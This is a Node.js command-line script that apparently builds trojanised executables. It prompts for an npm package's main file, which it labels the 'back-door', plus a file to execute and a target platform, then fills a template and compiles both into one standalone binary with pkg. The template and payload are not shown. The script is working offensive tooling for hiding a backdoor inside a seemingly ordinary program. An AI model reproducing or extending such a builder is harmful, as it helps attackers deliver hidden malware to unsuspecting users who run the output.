const inquirer = require('inquirer')
const path = require('path')
const fs = require('fs')
const pkg = require('pkg')
const { ncp } = require('ncp')
const { validate_path, dir_is_package, rmDir, replaceAll } = require('./src/utils')

// Costant values
const BACK_DOOR = 'back-door'
const FILE_TO_EXECUTE = 'file2exec'
const PLATFORM = 'platform'
const TEMPORANEY_FN = 'temp.js'

var prompt = inquirer.createPromptModule()

;(async function () {
    const index_dir = path.dirname(process.argv[1])
    const building_dir = path.join(index_dir, 'build')
    const template_path = path.join(index_dir, 'src/template.js')
    const loca_backdoor_dir = path.join(building_dir,'back_door')
    rmDir(loca_backdoor_dir, false)
    var ui = new inquirer.ui.BottomBar();
    ui.log.write(require('./src/icon'))

    let backdoor = (await prompt({ name: BACK_DOOR, message: 'Select the javascript main of the npm package to execute:', validate: validate_path }))[BACK_DOOR]

    if (!dir_is_package(backdoor)) throw new Error(`The js file isn't the main of npm package`)

    let file2exec = (await prompt({ name: FILE_TO_EXECUTE, message: 'Insert the file to execute:', validate: validate_path }))[FILE_TO_EXECUTE]
    let platform = (await prompt({name:PLATFORM , type: 'list', message: 'Select target platform', choices:['freebsd', 'linux', 'alpine', 'macos', 'win']}))[PLATFORM]

    ncp(path.dirname(backdoor), loca_backdoor_dir)

    let current_code = fs.readFileSync(template_path).toString('utf8')

    current_code = replaceAll(current_code, '*__execpath__*', `'${file2exec}'`)
    current_code = replaceAll(current_code, '*__backdoor__*', `'${'./back_door/' + path.basename(backdoor)}'`)

    let current_code_path = path.join(building_dir, TEMPORANEY_FN)

    fs.writeFileSync(current_code_path, current_code)

    pkg.exec([ current_code_path, '--target', `${platform}`, '--output', `${path.basename(file2exec)}.out` ])
})()
